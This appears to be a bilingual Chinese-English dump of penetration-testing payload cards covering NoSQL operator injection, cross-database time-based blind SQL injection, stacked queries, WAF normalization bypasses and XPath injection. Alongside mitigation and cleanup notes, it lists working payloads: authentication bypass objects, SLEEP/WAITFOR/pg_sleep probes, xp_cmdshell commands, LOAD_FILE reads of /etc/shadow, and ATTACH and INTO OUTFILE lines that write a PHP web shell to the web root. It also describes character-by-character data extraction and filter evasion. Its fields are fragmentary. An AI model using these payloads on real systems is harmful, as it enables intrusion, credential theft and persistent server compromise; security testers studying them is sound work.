vulnerability.zh: 根因是接口期望字符串却接受对象并直接传给 MongoDB 查询 API，操作符对象替代标量改变查询条件；启用 $where 时还会引入服务端脚本求值，危害进一步升级。
vulnerability.en: The root cause is an API expecting strings but accepting objects passed straight to the MongoDB query API, where operator objects replace scalars and change query conditions; enabling $where additionally introduces server-side script evaluation, escalating impact.

exploitation.zh: 使用第 1 步命令逐行提交 $gt/$ne/$regex/$where 等操作符与 JS 拼接变体；某行返回认证通过或结果集异常扩大即确认对应操作符注入成立。用测试账户先发送合法标量与同值对象建立对照，每次只修改一个身份字段并核对最终查询对象与命中记录 ID。
exploitation.en: Use the step 1 command to submit $gt/$ne/$regex/$where operators and JS-concatenation variants line by line; a row returning authentication success or abnormally enlarged result sets confirms that operator injection. With a test account, first send legitimate scalars and same-value objects as controls, modify one identity field per attempt, and check the final query object and matched record IDs.

mitigation.zh: 严格 JSON Schema 只接受有界字符串并拒绝对象、数组与美元键，固定查询结构并禁用不需要的 $where；修复后重放操作符载荷应被拒绝或登录失败。
mitigation.en: Enforce a strict JSON Schema accepting only bounded strings and rejecting objects, arrays, and dollar keys, pin the query structure, and disable unneeded $where; after the fix, replayed operator payloads must be rejected or fail login.

description.zh: 用户名口令字段同时换成比较操作符对象提交，匹配任意非空记录通过校验，直接获得已登录会话进入系统，权限随即到手。
description.en: Swap both fields for $gt/$ne empty-comparison objects matching any non-empty record and walk away with a session.

title.en: Match any value with regex wildcards

description.zh: 把字段值换为全匹配正则对象提交，任意内容均命中查询条件，配合已绕过的校验快速摸清各字段可控范围，圈定攻击面。
description.en: Replace values with .* regex objects that match anything, quickly mapping controllable fields alongside the bypassed checks.

title.zh: 脚本表达式构造布尔盲注

description.zh: 提交脚本表达式执行服务端判断逻辑，真假条件映射响应差异，无回显字段也能逐字符推断出内容推进盲取，逐位还原内容。
description.en: Submit $where expressions as server-side JS; true/false response deltas infer character content even without echo.

title.en: Rebuild sensitive fields character by character

description.zh: 以匹配函数配合前缀正则循环推进猜解，逐字符还原口令与令牌内容，完成 NoSQL 侧敏感数据提取的闭环。
description.en: Loop match with prefix regexes to rebuild passwords and tokens character by character, completing the NoSQL-side extraction.

review.rationale: 这些 JSON 是 MongoDB 查询边界载荷，不是 mongo 客户端命令。

description.zh: 绕过对 $ne/$gt 已加黑的 NoSQL 注入检测：换用 $regex 正则匹配构造恒真条件；登录通过或数据返回即成功。
description.en: Swap blacklisted $ne/$gt operators for $regex always-true matching; a successful login or returned data confirms success.

description.zh: 绕过对运算符键名的黑名单：把条件写入 $where 服务端 JS 表达式；查询命中任意账户即成功。
description.en: Move the condition into a server-side $where JS expression to bypass operator-key blacklists; any matching account confirms success.

description.zh: 绕过 JSON 体检测规则：以 PHP 风格数组参数在表单里传运算符；认证绕过生效即成功。
description.en: Pass operators via PHP-style array parameters in a form to bypass JSON-body rules; an effective auth bypass confirms success.

description.zh: 绕过对值内容敏感的过滤器：仅按 BSON 类型匹配字符串字段；返回字符串型记录即成功。
description.en: Match only by BSON string type to bypass value-content filters; string-typed records returning confirms success.

prerequisites.zh: 先识别唯一目标 DBMS，只使用对应的 SLEEP、WAITFOR DELAY 或 pg_sleep 方言，并验证驱动语句位置。
prerequisites.en: Identify the single target DBMS first, use only its SLEEP, WAITFOR DELAY, or pg_sleep dialect, and verify the driver's statement placement.

prerequisites.zh: 收集足够的正常时延分布和数据库会话日志，以随机顺序交错运行短延时恒真、恒假和无延时样本。
prerequisites.en: Collect a sufficient normal-latency distribution and database-session logs, then interleave short-delay true, false, and no-delay samples in randomized order.

analysis.zh: 阳性要求恒真样本的延迟分布相对恒假与无延时样本显著分离，并且每次慢响应都能关联到后端延时函数执行。单次超时、跨方言语法错误、网络峰值、WAF 挑战、锁等待、冷缓存或连接池饱和都是假阳性边界。
analysis.en: Positive evidence requires the true samples' latency distribution to separate significantly from false and no-delay controls, with every slow response correlated to backend delay-function execution. One timeout, cross-dialect syntax errors, network spikes, WAF challenges, lock waits, cold caches, or connection-pool saturation are false-positive boundaries.

opsecTips.zh: 达到事先定义的样本数和置信阈值后停止，不把延时从短值提升到语料中的最大值。
opsecTips.en: Stop when the predefined sample count and confidence threshold are reached; do not raise the delay from the short test value to the corpus maximum.

opsecTips.zh: 取消标记会话，排空连接池，恢复数据库语句超时，并删除采样结果中的请求标识与临时指标。
opsecTips.en: Cancel tagged sessions, drain the connection pool, restore database statement timeouts, and delete request identifiers and temporary metrics from the sample set.

name.zh: 跨数据库时间盲注探测

description.zh: 按 MySQL、SQL Server 和 PostgreSQL 方言使用 SLEEP、WAITFOR DELAY 与 pg_sleep，以统计证据验证无回显注入。
description.en: Uses SLEEP, WAITFOR DELAY, or pg_sleep according to MySQL, SQL Server, or PostgreSQL dialect to validate non-reflected injection statistically.

overview.zh: 覆盖跨数据库时间盲注的证据方法验证：按 MySQL、SQL Server、PostgreSQL 方言分别选用 SLEEP、WAITFOR DELAY 与 pg_sleep，以统计采样确认无回显注入。适用于方言未最终确认前的分通道时间探测。
overview.en: Covers cross-database time-based blind injection as an evidence methodology: choosing SLEEP, WAITFOR DELAY, or pg_sleep per MySQL, SQL Server, and PostgreSQL dialects and confirming no-echo injection via statistical sampling. Suitable for dialect-by-dialect timing probes before the backend is finally confirmed.

vulnerability.zh: 根因是拼接查询可在条件为真时调用延时或高成本函数，即使无回显也通过时间泄露布尔结果；延时函数还可能占用连接资源造成可用性影响。
vulnerability.en: The root cause is concatenated queries invoking delay or expensive functions when conditions are true, leaking boolean results through timing even without echo; delay functions can also consume connection resources and affect availability.

exploitation.zh: 使用第 1 步命令按已确认方言选择 SLEEP/WAITFOR/pg_sleep 行注入，其余方言行仅作格式参考；响应延迟约 5 秒即确认对应方言时间盲注成立。随机交错正常、恒真短延时与恒假短延时多次采样，计算中位数并排除网络抖动、缓存与锁等待干扰。
exploitation.en: Use the step 1 command to inject the SLEEP/WAITFOR/pg_sleep row for the confirmed dialect, treating other dialect rows as format references; a roughly five-second response delay confirms time-based blind injection for that dialect. Interleave normal, true-short-delay, and false-short-delay requests randomly across multiple samples, compute medians, and exclude network jitter, caching, and lock waits.

mitigation.en: Parameterize queries with strict type binding, set statement timeouts, resource groups, and connection-pool limits, and monitor delay functions and conditional long queries; after the fix, replayed delay payloads must show no statistical difference.

title.en: Confirm the channel with SLEEP delays

description.zh: 提交延迟形态语句观察五秒级的响应延迟，命中即确认时间盲注通道可用，作为跨库探测的统一信号源使用，支撑后续提取。
description.en: Fire SELECT SLEEP forms and watch for five-second stalls; hits confirm the timing channel as the cross-DB signal source.

attackChain.payload:
'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'
1;SELECT SLEEP(5)--
1' SELECT SLEEP(5)--
1" SELECT SLEEP(5)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--
1;WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1";WAITFOR DELAY '0:0:5'--
1;SELECT PG_SLEEP(5)--
1' AND (SELECT pg_sleep(5)) IS NOT NULL--

title.en: Identify the database via closure variants

description.zh: 依次试单双引号与数值型闭合形态，延迟出现的变体暴露真实拼接方式，据此判断数据库类型并选定语法集，载荷随之定型。
description.en: Rotate quote and numeric closures; whichever stalls exposes the real concatenation, identifying the DB and its syntax family.

attackChain.payload:
'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'
1;SELECT SLEEP(5)--
1' SELECT SLEEP(5)--
1" SELECT SLEEP(5)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--
1;WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1";WAITFOR DELAY '0:0:5'--
1;SELECT PG_SLEEP(5)--
1' AND (SELECT pg_sleep(5)) IS NOT NULL--

title.en: Extract per character with conditional delays

description.zh: 构造带子查询的条件延迟语句，按位真假触发等待，脚本循环记录时间差，还原库名表名与数据内容完成提取，循环直至收齐。
description.en: Wrap subqueries in AND-gated delays; per-bit truth stalls the clock, and scripted loops rebuild names and data from the gaps.

review.rationale: 跨 DBMS 延时函数共享同一盲注证据模型，按方言选择后仍是 Payload。

description.zh: 绕过对 SLEEP 关键字的拦截：重哈希计算制造等价延迟；响应时间较基线多出数秒即成功。
description.en: Induce an equivalent delay via repeated hashing when SLEEP is blocked; several extra seconds versus baseline confirm success.

description.zh: 绕过空格分词与 SELECT FROM 特征：全括号紧排并借派生表包裹延迟函数；5 秒延迟触发即成功。
description.en: Fully parenthesized tight nesting with a derived-table wrapper; the 5-second delay triggering confirms success.

description.zh: 绕过对延迟函数族的整体封锁：请求命名锁并等待超时；在无竞争时立即返回、有持锁会话时延迟即成功。
description.en: Request a named lock and wait out the timeout when the delay-function family is blocked; delayed return under a held lock confirms success.

title.en: Validation step 1 for Cross-DBMS Time-Based Blind SQL Injection

execution.command:
'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'
1;SELECT SLEEP(5)--
1' SELECT SLEEP(5)--
1" SELECT SLEEP(5)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--
1;WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1";WAITFOR DELAY '0:0:5'--
1;SELECT PG_SLEEP(5)--
1' AND (SELECT pg_sleep(5)) IS NOT NULL--

description.zh: 按已确认方言选择 SLEEP/WAITFOR/pg_sleep 行注入；响应延迟约 5 秒即确认对应方言时间盲注成立，其余方言行仅作格式参考。
description.en: Pick the SLEEP/WAITFOR/pg_sleep lines for the confirmed dialect; a ~5-second delay confirms time-based injection for that dialect, with other dialects' lines as format reference only.

prerequisites.zh: 依据 sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 等语法逐行重新识别方言，不沿用原 DB2/Cassandra/BigQuery 标签。
prerequisites.en: Reidentify the dialect line by line from syntax such as sqlite_version, sqlite_master, pragma_table_info, and ATTACH, without inheriting the original DB2/Cassandra/BigQuery label.

prerequisites.zh: 把只读目录探针与文件写入链放入不同审批和沙箱；写入分支只能使用可销毁 SQLite 副本及专用临时目录。
prerequisites.en: Place read-only catalog probes and file-write chains under separate approvals and sandboxes; the write branch may use only a disposable SQLite copy and dedicated temporary directory.

analysis.zh: 本条拆分的阳性证据是每段语法被路由到实际方言和影响模型：只读分支只能返回合成 sqlite_master 标记，写入分支必须由独立审计确认只在临时路径产生固定文件。原标签匹配、普通语法错误、返回任意版本字符串、ATTACH 被拒绝或仅生成 SQL 文本都不是相应能力的证明。
analysis.en: Positive evidence for the split is each fragment being routed to its actual dialect and impact model: the read-only branch may return only a synthetic sqlite_master marker, while the write branch requires separate auditing of a fixed file created solely in the temporary path. Matching the original label, generic syntax errors, any version string, denied ATTACH, or merely generating SQL text does not prove the corresponding capability.

opsecTips.zh: 审校到 ATTACH 或文件写入语句时停止于拆分边界，未经独立写入验证流程不得执行。
opsecTips.en: Stop at the split boundary when review reaches ATTACH or file-write statements; do not execute them without the separate write-validation workflow.

opsecTips.zh: 删除 SQLite 副本、附加数据库和临时目录，撤销进程写权限，并清除错误的 DBMS 标签缓存与测试路由记录。
opsecTips.en: Delete SQLite copies, attached databases, and the temporary directory, revoke process write permissions, and clear cached incorrect DBMS labels and test-routing records.

name.zh: 误标数据库混合集（待拆分）

description.zh: 名称声称 DB2、Cassandra 与 BigQuery，实际却主要是 SQLite 系统表、通用 INFORMATION_SCHEMA 和 SQLite 文件写入链。
description.en: The name claims DB2, Cassandra, and BigQuery, but the content is mainly SQLite catalogs, generic INFORMATION_SCHEMA, and a SQLite file-write chain.

subCategory.zh: 数据库方言内容纠错与拆分

overview.zh: 误标数据库混合集（待拆分）聚焦sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 均指向 SQLite，原标签没有命令支撑，继续聚合会误导。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Mislabeled Mixed-Database Corpus (Split Required) focuses on this boundary: sqlite_version, sqlite_master, pragma_table_info, and ATTACH all indicate SQLite, leaving the original label unsupported and misleading. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 数据库目录、文件权限和多语句能力完全不同；混合卡会把语法错误误判为防护，并把只读探测与文件写入混在一起。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Catalogs, file permissions, and multi-statement capabilities differ; a mixed card confuses syntax errors with controls and combines read-only probes with file writes. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 将 SQLite 版本和目录行路由到 SQLite 卡，兼容的目录 UNION 行路由到 UNION 卡，ATTACH/CREATE/INSERT 链路由到堆叠影响卡。 每个目标卡必须单独确认数据库产品、查询上下文和权限；不得按原错误标题批量执行，也不能以其他方言报错定性。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Route SQLite version and catalog lines to the SQLite card, compatible catalog UNION lines to UNION, and ATTACH/CREATE/INSERT to the stacked-impact card. Each target card must separately confirm product, query context, and privileges; never batch-run under the incorrect title or classify cross-dialect errors as evidence. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 除参数化外，限制 SQLite 文件和 Web 根写权限，关闭不需要的多语句，并要求名称、方言和引用一致后发布。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Besides parameterization, restrict SQLite file and web-root writes, disable unnecessary multi-statements, and require title, dialect, and references to agree before publication. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认数据库方言内容纠错与拆分前置条件
title.en: Confirm Database-Dialect Correction and Split prerequisites

description.zh: sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 均指向 SQLite，原标签没有命令支撑，继续聚合会误导。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: sqlite_version, sqlite_master, pragma_table_info, and ATTACH all indicate SQLite, leaving the original label unsupported and misleading. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控数据库方言内容纠错与拆分探针
title.en: Run a controlled Database-Dialect Correction and Split probe

description.zh: 将 SQLite 版本和目录行路由到 SQLite 卡，兼容的目录 UNION 行路由到 UNION 卡，ATTACH/CREATE/INSERT 链路由到堆叠影响卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Route SQLite version and catalog lines to the SQLite card, compatible catalog UNION lines to UNION, and ATTACH/CREATE/INSERT to the stacked-impact card. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
1 UNION SELECT sqlite_version()--
1 UNION SELECT sql FROM sqlite_master--
1 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
1 UNION SELECT group_concat(name) FROM pragma_table_info('users')--
ATTACH DATABASE '/var/www/html/shell.php' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn(dataz) VALUES('<?php system(["cmd"]);?>');--
1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--
1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--

title.zh: 核对数据库方言内容纠错与拆分成功证据
title.en: Verify Database-Dialect Correction and Split evidence

description.zh: 每个目标卡必须单独确认数据库产品、查询上下文和权限；不得按原错误标题批量执行，也不能以其他方言报错定性。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Each target card must separately confirm product, query context, and privileges; never batch-run under the incorrect title or classify cross-dialect errors as evidence. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归数据库方言内容纠错与拆分
title.en: Remediate and regress Database-Dialect Correction and Split

description.zh: 除参数化外，限制 SQLite 文件和 Web 根写权限，关闭不需要的多语句，并要求名称、方言和引用一致后发布。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Besides parameterization, restrict SQLite file and web-root writes, disable unnecessary multi-statements, and require title, dialect, and references to agree before publication. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 原标签与命令不符，且只读目录查询与文件写入链前置条件不同，必须拆分。

prerequisites.zh: 为每种 DBMS 使用独立可销毁实例，先确认驱动允许多语句，并仅以短延时第二语句建立只读证明。
prerequisites.en: Use a separate disposable instance for each DBMS, first confirm that the driver permits multiple statements, and establish read-only proof only with a short-delay second statement.

prerequisites.zh: 为 xp_cmdshell、LOAD_FILE 和 OUTFILE 分别记录功能开关、数据库角色、服务账户及文件系统权限，不共享前置条件。
prerequisites.en: Record feature switches, database roles, service identities, and filesystem permissions separately for xp_cmdshell, LOAD_FILE, and OUTFILE; do not share prerequisites.

analysis.zh: 阳性必须按拆分层级判定：短延时且有会话审计只能证明第二语句执行；命令、读文件或写文件能力还必须在各自隔离流程中产生唯一无害标记和系统审计事件。模型或页面回显 SQL、一次慢响应、权限错误、空结果、虚构命令输出或数据库功能已关闭都不是高影响链成功。
analysis.en: Positive evidence must be evaluated per split tier: a short tagged delay proves only second-statement execution, while command, file-read, or file-write capability additionally requires a unique harmless marker and system audit event in its own isolated workflow. SQL reflected by a model or page, one slow response, permission errors, empty results, fabricated command output, or a disabled database feature is not a successful high-impact chain.

opsecTips.zh: 短延时第二语句得到一次可重复证明后停止；不得在同一运行中继续到 xp_cmdshell、LOAD_FILE 或 OUTFILE。
opsecTips.en: Stop after one repeatable proof of the short-delay second statement; do not continue to xp_cmdshell, LOAD_FILE, or OUTFILE in the same run.

opsecTips.zh: 终止等待会话，删除临时表和标记文件，撤销文件权限并恢复 xp_cmdshell 等功能开关及连接池状态。
opsecTips.en: Terminate waiting sessions, delete temporary tables and marker files, revoke filesystem grants, and restore feature switches such as xp_cmdshell and connection-pool state.

name.zh: 堆叠查询与数据库高影响链（待拆分）
name.en: Stacked Queries and High-Impact Database Chains (Split Required)

description.zh: 混合时间证明、SQL Server 命令执行、数据库文件读取与 MySQL 文件写入，需按影响和权限拆分。
description.en: Combines timing proof, SQL Server command execution, database file reads, and MySQL file writes and must be split by impact and privileges.

overview.zh: 堆叠查询与数据库高影响链（待拆分）聚焦分号后的短延时只能证明第二语句执行；xp_cmdshell、LOAD_FILE 和 OUTFILE 各自需要产品、开关、角色和文件 ACL。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Stacked Queries and High-Impact Database Chains (Split Required) focuses on this boundary: A short delay after a semicolon proves second-statement execution, while xp_cmdshell, LOAD_FILE, and OUTFILE each require product, feature, role, and filesystem prerequisites. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入可结束原语句并追加 SQL 时，影响由驱动和数据库账户决定；高权限功能会把注入升级为命令、文件读取或代码落地。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: When input can terminate and append SQL, impact depends on driver and database-account capabilities; privileged features escalate injection to commands, file reads, or code placement. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 先只用短延时或固定常量 SELECT 证明堆叠，再读取配置与权限元数据；高影响命令分别路由到对应目标卡。 数据库审计必须显示同一请求执行第二语句；whoami、系统文件或 WebShell 失败只说明权限不足，不能否定堆叠注入。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: First prove stacking with a short delay or fixed constant SELECT, then inspect configuration and privilege metadata; route high-impact commands to focused target cards. Database auditing must show the same request executing a second statement; failure of whoami, system files, or a web shell indicates privilege limits, not absence of stacking. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化查询、关闭不需要的多语句，禁用 xp_cmdshell，撤销 FILE 权限，并禁止数据库服务账户写入 Web 根。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize queries, disable unnecessary multi-statements and xp_cmdshell, revoke FILE privilege, and deny web-root writes to the database service account. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认堆叠查询影响拆分前置条件

description.zh: 分号后的短延时只能证明第二语句执行；xp_cmdshell、LOAD_FILE 和 OUTFILE 各自需要产品、开关、角色和文件 ACL。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: A short delay after a semicolon proves second-statement execution, while xp_cmdshell, LOAD_FILE, and OUTFILE each require product, feature, role, and filesystem prerequisites. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控堆叠查询影响拆分探针
title.en: Run a controlled Stacked-Query Impact Split probe

description.zh: 先只用短延时或固定常量 SELECT 证明堆叠，再读取配置与权限元数据；高影响命令分别路由到对应目标卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: First prove stacking with a short delay or fixed constant SELECT, then inspect configuration and privilege metadata; route high-impact commands to focused target cards. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
;SELECT SLEEP(5);--
';SELECT SLEEP(5);--
";SELECT SLEEP(5);--
' OR IF(1=1, SLEEP(5), 0)--
EXEC xp_cmdshell 'whoami';--
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';--
SELECT LOAD_FILE('/etc/passwd');--
SELECT LOAD_FILE('/etc/shadow');--
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');--
' UNION SELECT '<?php system(["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'--

title.zh: 核对堆叠查询影响拆分成功证据

description.zh: 数据库审计必须显示同一请求执行第二语句；whoami、系统文件或 WebShell 失败只说明权限不足，不能否定堆叠注入。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Database auditing must show the same request executing a second statement; failure of whoami, system files, or a web shell indicates privilege limits, not absence of stacking. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归堆叠查询影响拆分
title.en: Remediate and regress Stacked-Query Impact Split

description.zh: 参数化查询、关闭不需要的多语句，禁用 xp_cmdshell，撤销 FILE 权限，并禁止数据库服务账户写入 Web 根。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize queries, disable unnecessary multi-statements and xp_cmdshell, revoke FILE privilege, and deny web-root writes to the database service account. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 同一命令块跨越只读证明、命令执行、文件读取和写入，必须按影响和 DBMS 拆分。

prerequisites.zh: 在 WAF、反向代理、应用框架和数据库边界记录原始字节、解码次数、字符集和最终 SQL 令牌。
prerequisites.en: Record raw bytes, decode count, character set, and final SQL tokens at the WAF, reverse proxy, application framework, and database boundaries.

prerequisites.zh: 确认 MySQL 版本注释及目标方言的注释规则，为规范形式、单一变换形式和结构相同的恒假谓词建立配对。
prerequisites.en: Confirm MySQL version-comment behavior and the target dialect's comment rules, pairing canonical, single-transformation, and structurally matched false predicates.

analysis.zh: 阳性是规范形式被同一策略阻止，而某个最小编码、大小写或注释拆分变体被放行，随后由应用/数据库规范化为可执行谓词并产生受控标记差异。WAF 未告警、HTTP 200、日志显示 SELECT、数据库报语法错、双重解码只改变显示或页面复述字符串均是假阳性。
analysis.en: Positive evidence is the canonical form being blocked by the same policy while one minimal encoding, case, or comment-splitting variant passes, is normalized into an executable predicate by the application or database, and produces a controlled marker differential. No WAF alert, HTTP 200, SELECT appearing in logs, a database syntax error, double decoding that changes only display, or page reflection is a false positive.

opsecTips.zh: 确认一个最小变换及其发生分歧的层后停止，不继续组合大小写、注释和多重百分号编码。
opsecTips.en: Stop after confirming one minimal transformation and the layer where behavior diverges; do not combine case, comments, and repeated percent encoding.

opsecTips.zh: 移除原始流量调试记录，清空代理和应用解码缓存，删除临时 WAF 例外，并恢复统一规范化规则。
opsecTips.en: Remove raw-traffic debug records, clear proxy and application decoding caches, delete temporary WAF exceptions, and restore consistent normalization rules.

name.zh: SQL 注入规范化绕过模式

description.zh: 使用版本注释、关键词拆分、百分号编码和大小写变体，验证 WAF、应用与数据库解码及词法分析是否一致。
description.en: Uses version comments, keyword splitting, percent encoding, and case variants to test decoding and lexical consistency across WAF, application, and database.

overview.zh: 覆盖 SQL 注入的规范化绕过模式验证：版本注释、关键词拆分（内联注释分词）、百分号编码与大小写变体提交恒真 UNION。适用于 WAF 一次解码或简单正则检测、应用与数据库解码链不一致的场景。
overview.en: Covers normalization-bypass patterns for SQL injection: always-true UNION submissions via version comments, keyword splitting (inline-comment tokenization), percent encoding, and case variants. Suitable when the WAF decodes once or matches simple regexes while application and database decode chains diverge.

vulnerability.zh: 根因是 WAF 一次解码或简单正则后判断，而应用再次解码或数据库赋予注释特殊语义，攻击文本在检测后恢复为有效 SQL；各层规范化不一致即绕过点。
vulnerability.en: The root cause is the WAF deciding after one decode or simple regex while the application decodes again or the database gives comments special semantics: attack text reverts to valid SQL after inspection, and inconsistent normalization across layers is the bypass point.

exploitation.zh: 使用第 1 步命令以版本注释、URL 编码、注释分词等规范化变体提交恒真 UNION；语句仍执行并返回结果即确认对应规范化差异可绕过检测。先以普通 UNION 确认注入且被拦截作为对照，再一次只改变注释、编码或大小写，保持 SQL 语义与其他字节不变。
exploitation.en: Use the step 1 command to submit always-true UNION via normalization variants such as version comments, URL encoding, and comment tokenization; the statement still executing and returning results confirms the corresponding normalization differential bypasses detection. First confirm plain UNION injects and is blocked as a control, then change only the comment, encoding, or case per attempt while keeping SQL semantics and other bytes unchanged.

mitigation.zh: 在可信边界只做一次严格规范化，拒绝双重编码与非法 UTF-8，再类型校验与参数绑定，WAF 仅作纵深防御；修复后各变体应被统一处理，回归覆盖完整变体集。
mitigation.en: Perform exactly one strict normalization at the trusted boundary, reject double encodings and invalid UTF-8, then type-check and parameterize, keeping the WAF as defense-in-depth; after the fix, all variants must be handled uniformly with regression over the complete variant set.

title.en: Punch through with versioned inline comments

description.zh: 用版本注释包裹关键字提交探测，数据库识别执行而多数规则不解析该形态，语句生效即可确认绕过成立，通道随即打开。
description.en: Wrap keywords in /*!50000*/ versioned comments; MySQL honors them while most rules do not, and execution proves the bypass.

title.zh: 编码与双写拆分关键字
title.en: Split keywords with encoding and double writes

description.zh: 关键字换半编码、注释拆分与双写形态提交，单点特征全部失效，重组后的语句保持注入语义继续执行利用，注入继续生效。
description.en: Rewrite keywords as partial URL encodes, comment splits or double writes; point signatures die while reassembled semantics hold.

description.zh: 恒真条件改写为逻辑链组合的等价形式，覆盖范围不变而文本特征全新，绕过针对原形态的检测规则继续利用，规则随即失效。
description.en: Recast tautologies as equivalent AND/OR chains; coverage is identical but the text is new, evading shape-specific rules.

title.zh: 与标准形态比对定位拦截
title.en: Diff against the standard form to locate blocks

description.zh: 以未变形语句为参照逐段替换比对，精确定位触发拦截的片段后仅对其变形，其余保持原样降低连带失败风险，绕过随之成立。
description.en: Against the unmodified statement, swap segments pairwise to pinpoint the rule-triggering piece and reshape only that fragment.

review.rationale: 这是 SQL 词法和规范化层面的 Payload 集，不是 WAF 指纹工具或通用字典。

prerequisites.zh: 使用只含合成用户和随机 canary 节点的独立 XML 文档，并确认 XPath 版本、命名空间及输入拼接位置。
prerequisites.en: Use an isolated XML document containing only synthetic users and a random canary node, and confirm the XPath version, namespaces, and input concatenation position.

prerequisites.zh: 启用编译后 XPath 或查询结果审计，为名称、节点计数和 substring 条件分别准备结构一致的真/假对照。
prerequisites.en: Enable compiled-XPath or query-result auditing, and prepare structurally matched true and false controls for name, node-count, and substring conditions.

analysis.zh: 阳性要求恒真 XPath 条件稳定返回预置 canary 节点或计数，而恒假条件不返回，且编译查询显示输入越过字符串边界。XML 解析错误、命名空间不匹配、正常搜索命中、页面回显表达式、或猜中常见节点名都不是 XPath 注入证据。
analysis.en: Positive evidence requires the true XPath condition to reproducibly return the preset canary node or count while the false condition does not, with the compiled query showing input crossing the string boundary. XML parse errors, namespace mismatch, legitimate search matches, expression reflection, or guessing a common node name are not XPath-injection evidence.

opsecTips.zh: 首次通过真/假条件定位到 canary 节点后停止，不枚举生产 XML 的用户、密码或完整树结构。
opsecTips.en: Stop after the first true/false pair locates the canary node; do not enumerate users, passwords, or the full tree of production XML.

opsecTips.zh: 删除测试 XML 和 canary，清除编译查询与响应缓存，并恢复命名空间配置和参数化 XPath 构造。
opsecTips.en: Delete the test XML and canary, clear compiled-query and response caches, and restore namespace configuration and parameterized XPath construction.

name.zh: XPath 表达式注入

description.zh: 通过布尔谓词、节点计数、名称判断和 substring 条件，验证输入是否被拼接到 XPath 查询表达式。
description.en: Uses Boolean predicates, node counts, name tests, and substring conditions to verify whether input is concatenated into an XPath query expression.

